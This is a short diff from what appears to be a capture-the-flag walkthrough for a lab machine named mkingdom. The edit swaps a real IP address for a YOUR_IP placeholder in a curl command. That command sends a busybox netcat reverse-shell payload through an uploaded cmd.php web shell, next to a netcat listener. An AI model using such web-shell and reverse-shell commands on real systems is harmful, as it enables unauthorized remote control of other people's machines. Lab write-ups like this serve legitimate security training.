@@ -93,7 +93,7 @@ nc -lnvp 4444
    2. Trigger reverse shell via web shell:
 
 ```bash
-curl 'http://mkingdom.thm:85/app/castle/application/files/9817/6188/7568/cmd.php?cmd=busybox%20nc%2010.9.1.13%204444%20-e%20bash'
+curl 'http://mkingdom.thm:85/app/castle/application/files/9817/6188/7568/cmd.php?cmd=busybox%20nc%20YOUR_IP%204444%20-e%20bash'
 ```
    3. Upgrade shell for better interaction: 
 
